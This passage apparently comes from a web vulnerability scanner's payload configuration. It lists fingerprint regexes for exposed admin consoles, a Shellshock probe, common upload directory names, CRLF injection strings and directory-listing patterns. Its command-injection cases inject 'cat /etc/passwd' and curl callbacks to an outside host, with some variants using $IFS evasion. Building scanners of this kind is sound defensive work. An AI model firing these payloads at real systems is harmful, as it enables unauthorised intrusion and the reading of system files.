        "target": "(<title>JBoss\\s*JMX\\s*Management\\s*Console[^<]*</title>[\\s\\S]*ObjectFilterView)|(<title>JBoss\\s*AS\\s*Admin\\s*Console</title>[\\s\\S]*name=\"login_form:submit\")|(<title>JBoss\\s*Management\\s*Console[^<]*</title>[\\s\\S]*alt=\"JBoss\")|(<title>JBoss\\s*Object\\s*Index</title>[\\s\\S]*alt=\"JBoss\")|(<title>Welcome\\s*to\\s*JBoss\\s*Application\\s*Server\\s*\\d</title>[\\s\\S]*JBoss\\s*and\\s*JBoss\\s*Community)|(<title>XAMPP[\\s\\S]*</title>[\\s\\S]*frameset\\s*cols=\"150,\\*\")|(<title>Welcome\\sto\\sXAMPP[^<]*</title>[\\s\\S]*XAMPP Control Panel)|(<span class=\"nh\">&nbsp;XAMPP.*[\\d\\.]+)|(wiki_:resourceloader:filter:minify-css[\\s\\S]*mw-label[\\s\\S]*wpPassword1)|(<form\\smethod=(\"|')post(\"|')\\saction=(\"|')setup-config.php\\?step=2(\"|')>)|(wiki_:resourceloader:filter:minify-css[\\s\\S]*mw-log-user[\\s\\S]*mw-log-page)|(dokuwiki__content[\\s\\S]*type=\"password\"\\s*name=\"p\")|(<title>Openfire\\s*Admin\\s*Console[^<]*</title>[\\s\\S]*jive-login-header)|(<title>srpc\\s*index</title>[\\s\\S]*srpc)|(Zabbix[\\s\\S]*<\\!-- Login Form -->[\\s\\S]*Remember\\s*me)|(<title>jenkins[^<]*</title>[\\s\\S]*<input[^/]*type\\s*=\\s*(\"|')password(\"|')[^/]*name\\s*=\\s*(\"|')j_password(\"|')[^/]*/?>)|(<title>Dashboard\\s*\\[Jenkins\\][^<]*</title>[\\s\\S]*<a[^/]*href=\"http://jenkins-ci\\.org\">)|(<title>WebLogic\\s*Server[^<]*</title>)|(<title>webftp[^<]*</title>[\\s\\S]*type=(\"|')password(\"|'))|(<title>Task\\s*Tracker\\s*Status</title>(.*[\\r\\n])*.*Version:.*[\\d\\.]+)|(<(title|h1)>(Discuz\\!\\s|UCenter\\s)?Administrator's\\sControl\\sPanel)|(<title>(Resin Admin Login)|(Resin Administration)[^<]*</title>)|(<title>OGNL\\s*Console[^<]*</title>[\\s\\S]*Welcome to the OGNL console!)|(<option\\svalue=\"pmahomme\"\\sselected=\"selected\">pmahomme)|(<input\\stype=\"password\"\\sname=\"pma_password\")|(<title>Apache\\sTomcat[^>]*</title>[\\s\\S]*\\$CATALINA_HOME)|(content='noindex,follow'[\\s\\S]*class=\"forgetmenot\"[\\s\\S]*backtoblog)|(<title>Apache\\s*Tomcat.*Documentation\\s*Index</title>[\\s\\S]*<\\!--PROJECT\\s*LOGO-->)|(<title>Cloudera\\s+Manager</title>[\\s\\S]*<input\\s+type=\"password\"\\s+class=\"input-large\"\\s+id=\"password\"\\s+name=\"j_password\")|(<input\\s+name=\"password\"\\s+type=\"password\"\\s+class=\"ipt\")|(<title>Shell\\sIn\\sA\\sBox</title>)",
        "input": "/",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

]

bash_leak_detect_test_cases = [

    {
        "case_id": 1190050001,
        "target": "TSTBashScan",
        "input": "() { 1;}; echo `echo TSTBashScan:TST`;",
        "encode":  "NO",
    },

]

upload_file_detect_upload_dirs = [

    {
        "case_id": 1180010058,
        "input": "tmp/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010057,
        "input": "Temp/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010056,
        "input": "temp/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010055,
        "input": "temporary/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010054,
        "input": "templates/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010053,
        "input": "down/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010052,
        "input": "upld/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010051,
        "input": "UP/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010050,
        "input": "Up/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010049,
        "input": "up/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010048,
        "input": "downloads/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010047,
        "input": "download/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010046,
        "input": "File_Upload/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010045,
        "input": "file_upload/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010044,
        "input": "FileUpload/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010043,
        "input": "fileupload/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010042,
        "input": "User/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010041,
        "input": "user/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010040,
        "input": "File/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010039,
        "input": "file/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010038,
        "input": "Files/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010037,
        "input": "files/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010036,
        "input": "Data/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010035,
        "input": "data/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010034,
        "input": "Pictures/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010033,
        "input": "pictures/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010032,
        "input": "IMG/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010031,
        "input": "Img/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010030,
        "input": "img/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010029,
        "input": "IMAGES/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010028,
        "input": "Images/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010027,
        "input": "images/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010026,
        "input": "UPLOAD/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010025,
        "input": "Upload/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010024,
        "input": "upload/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010023,
        "input": "UPLOADS/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010022,
        "input": "Uploads/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010021,
        "input": "uploads/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010020,
        "input": "_upload/",
        "encode":  "NO",
    },

    {
        "case_id": 1180010019,
        "input": "_uploads/",
        "encode":  "NO",
    },

]

cmd_inject_detect_test_cases = [

    {
        "case_id": 1040030021,
        "input": "\"|\"ld",
        "target": "ld:\\sno\\sinput\\sfiles",
        "encode":  "ALL",
    },

    {
        "case_id": 1040030020,
        "input": "'|'ld",
        "target": "ld:\\sno\\sinput\\sfiles",
        "encode":  "ALL",
    },

    {
        "case_id": 1040030019,
        "input": "|dir -clt",
        "target": "(([-|x|r|d|w|]{10})\\s([\\d]+)\\s([\\w]+)\\s([\\w]+)\\s([\\d]+)\\s([\\w]+)\\s([\\d]+)\\s([\\d]{2}:[\\d]{2})\\s([\\w._-]+))+",
        "encode":  "YES",
    },

    {
        "case_id": 1040030018,
        "input": "\"|dir -clt",
        "target": "(([-|x|r|d|w|]{10})\\s([\\d]+)\\s([\\w]+)\\s([\\w]+)\\s([\\d]+)\\s([\\w]+)\\s([\\d]+)\\s([\\d]{2}:[\\d]{2})\\s([\\w._-]+))+",
        "encode":  "YES",
    },

    {
        "case_id": 1040030016,
        "input": "'|dir -clt",
        "target": "(([-|x|r|d|w|]{10})\\s([\\d]+)\\s([\\w]+)\\s([\\w]+)\\s([\\d]+)\\s([\\w]+)\\s([\\d]+)\\s([\\d]{2}:[\\d]{2})\\s([\\w._-]+))+",
        "encode":  "YES",
    },

    {
        "case_id": 1040030017,
        "input": "\"&dir -clt&\"",
        "target": "(([-|x|r|d|w|]{10})\\s([\\d]+)\\s([\\w]+)\\s([\\w]+)\\s([\\d]+)\\s([\\w]+)\\s([\\d]+)\\s([\\d]{2}:[\\d]{2})\\s([\\w._-]+))+",
        "encode":  "YES",
    },

    {
        "case_id": 1040030015,
        "input": "'&dir -clt&'",
        "target": "(([-|x|r|d|w|]{10})\\s([\\d]+)\\s([\\w]+)\\s([\\w]+)\\s([\\d]+)\\s([\\w]+)\\s([\\d]+)\\s([\\d]{2}:[\\d]{2})\\s([\\w._-]+))+",
        "encode":  "YES",
    },

    {
        "case_id": 1040030014,
        "input": "&dir -clt",
        "target": "(([-|x|r|d|w|]{10})\\s([\\d]+)\\s([\\w]+)\\s([\\w]+)\\s([\\d]+)\\s([\\w]+)\\s([\\d]+)\\s([\\d]{2}:[\\d]{2})\\s([\\w._-]+))+",
        "encode":  "YES",
    },

    {
        "case_id": 1040030012,
        "input": "&&dir -clt&&",
        "target": "(([-|x|r|d|w|]{10})\\s([\\d]+)\\s([\\w]+)\\s([\\w]+)\\s([\\d]+)\\s([\\w]+)\\s([\\d]+)\\s([\\d]{2}:[\\d]{2})\\s([\\w._-]+))+",
        "encode":  "YES",
    },

    {
        "case_id": 1040030013,
        "input": "&&dir -clt&&'",
        "target": "(([-|x|r|d|w|]{10})\\s([\\d]+)\\s([\\w]+)\\s([\\w]+)\\s([\\d]+)\\s([\\w]+)\\s([\\d]+)\\s([\\d]{2}:[\\d]{2})\\s([\\w._-]+))+",
        "encode":  "YES",
    },

    {
        "case_id": 1040030011,
        "input": "\";cat /etc/passwd TST;\"",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030010,
        "input": "\"&cat /etc/passwd TST&\"",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030009,
        "input": "||cat /etc/passwd TST",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030008,
        "input": "|cat /etc/passwd TST#",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030007,
        "input": "cat /etc/passwd TST",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030006,
        "input": "`cat /etc/passwd TST`",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030005,
        "input": "\ncat /etc/passwd TST\n",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030004,
        "input": ";cat /etc/passwd TST;",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030003,
        "input": "';cat /etc/passwd TST;'",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030002,
        "input": "'&cat /etc/passwd TST&'",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030001,
        "input": "&cat /etc/passwd TST&",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030034,
        "input": "$(dir$IFS-clt)",
        "target": "(([-|x|r|d|w|]{10})\\s([\\d]+)\\s([\\w]+)\\s([\\w]+)\\s([\\d]+)\\s([\\w]+)\\s([\\d]+)\\s([\\d]{2}:[\\d]{2})\\s([\\w._-]+))+",
        "encode":  "YES",
    },

    {
        "case_id": 1040030022,
        "input": "\"|curl http://10.153.138.81/cmd_inject/",
        "target": "nil",
        "encode":  "YES",
    },

    {
        "case_id": 1040030023,
        "input": "\"&curl http://10.153.138.81/cmd_inject/&\"",
        "target": "nil",
        "encode":  "YES",
    },

    {
        "case_id": 1040030024,
        "input": "'|curl http://10.153.138.81/cmd_inject/",
        "target": "nil",
        "encode":  "YES",
    },

    {
        "case_id": 1040030025,
        "input": "'&curl http://10.153.138.81/cmd_inject/&'",
        "target": "nil",
        "encode":  "YES",
    },

    {
        "case_id": 1040030026,
        "input": "&&curl http://10.153.138.81/cmd_inject/&&",
        "target": "nil",
        "encode":  "YES",
    },

    {
        "case_id": 1040030027,
        "input": "||curl http://10.153.138.81/cmd_inject/",
        "target": "nil",
        "encode":  "YES",
    },

    {
        "case_id": 1040030028,
        "input": "`curl http://10.153.138.81/cmd_inject/`",
        "target": "nil",
        "encode":  "YES",
    },

    {
        "case_id": 1040030029,
        "input": "\ncurl http://10.153.138.81/cmd_inject/\n",
        "target": "nil",
        "encode":  "YES",
    },

    {
        "case_id": 1040030030,
        "input": ";curl http://10.153.138.81/cmd_inject/;",
        "target": "nil",
        "encode":  "YES",
    },

    {
        "case_id": 1040030031,
        "input": "';curl http://10.153.138.81/cmd_inject/;'",
        "target": "nil",
        "encode":  "YES",
    },

    {
        "case_id": 1040030032,
        "input": "\";curl http://10.153.138.81/cmd_inject/;\"",
        "target": "nil",
        "encode":  "YES",
    },

    {
        "case_id": 1040030037,
        "input": "$(dir -clt)",
        "target": "(([-|x|r|d|w|]{10})\\s([\\d]+)\\s([\\w]+)\\s([\\w]+)\\s([\\d]+)\\s([\\w]+)\\s([\\d]+)\\s([\\d]{2}:[\\d]{2})\\s([\\w._-]+))+",
        "encode":  "YES",
    },

    {
        "case_id": 1040030035,
        "input": "||curl$IFS\\http://10.153.138.81/cmd_inject/",
        "target": "nil",
        "encode":  "ALL",
    },

    {
        "case_id": 1040030036,
        "input": "`cat$IFS/etc/passwd$IFSTST`",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030038,
        "input": "$(cat /etc/passwd TST)",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):([\\d\\w-\\s]+):(\\d+):(\\d+):([\\w-\\s]*):([\\w-_\\s\\/]*):([\\w-_\\/]*))|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "YES",
    },

    {
        "case_id": 1040030039,
        "input": "$(curl$IFS\\http://10.153.138.81/cmd_inject/)",
        "target": "nil",
        "encode":  "ALL",
    },

]


crlf_leak_detect_test_cases = [

    {
        "case_id": 1100030001,
        "target": "[\\r\\n]\\s*CustomedHeaderItem:\\s*iCook=iValue",
        "input": "%0d%0a%20CustomedHeaderItem:%20iCook%3diValue",
        "encode":  "NO",
    },

    {
        "case_id": 1100030002,
        "target": "[\\r\\n]\\s*CustomedHeaderItem:\\s*iCook=iValue",
        "input": "%0d%0aCustomedHeaderItem:%20iCook%3diValue",
        "encode":  "NO",
    },

    {
        "case_id": 1100030003,
        "input": "%0d%0aCustomedHeaderItem:iCook%3diValue",
        "target": "[\\r\\n]\\s*CustomedHeaderItem:\\s*iCook=iValue",
        "encode":  "NO",
    },

    {
        "case_id": 1100030004,
        "input": "%0aCustomedHeaderItem:%20iCook%3diValue",
        "target": "[\\r\\n]\\s*CustomedHeaderItem:\\s*iCook=iValue",
        "encode":  "NO",
    },

    {
        "case_id": 1100030005,
        "input": "%0dCustomedHeaderItem:%20iCook%3diValue",
        "target": "[\\r\\n]\\s*CustomedHeaderItem:\\s*iCook=iValue",
        "encode":  "NO",
    },

]

cross_dom_shit_conf_detect_test_cases = [

    {
        "case_id": 1030030001,
        "target": "(<domain\\s+uri\\s?=\\s?\"\\*\")|([^-\\s\\t][\\s\\t]*<[\\s\\t]*allow-access-from\\s*domain=\\s*\"\\s*\\*\\s*\")",
        "input": "clientaccesspolicy.xml",
        "encode":  "NO",
    },

    {
        "case_id": 1030030002,
        "target": "(<domain\\s+uri\\s?=\\s?\"\\*\")|([^-\\s\\t][\\s\\t]*<[\\s\\t]*allow-access-from\\s*domain=\\s*\"\\s*\\*\\s*\")",
        "input": "crossdomain.xml",
        "encode":  "NO",
    },

]


dir_iterate_detect_test_cases = [

    {
        "case_id": 1060010009,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_private",
        "encode":  "NO",
    },

    {
        "case_id": 1060010010,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_source",
        "encode":  "NO",
    },

    {
        "case_id": 1060010008,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_pages",
        "encode":  "NO",
    },

    {
        "case_id": 1060010007,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_old",
        "encode":  "NO",
    },

    {
        "case_id": 1060010006,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_logs",
        "encode":  "NO",
    },

    {
        "case_id": 1060010005,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "_layouts",
        "encode":  "NO",
    },

    {
        "case_id": 1060010004,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "__MACOSX",
        "encode":  "NO",
    },

    {
        "case_id": 1060010003,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "WS_FTP",
        "encode":  "NO",
    },

    {
        "case_id": 1060010002,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "New folder (2)",
        "encode":  "YES",
    },

    {
        "case_id": 1060010001,
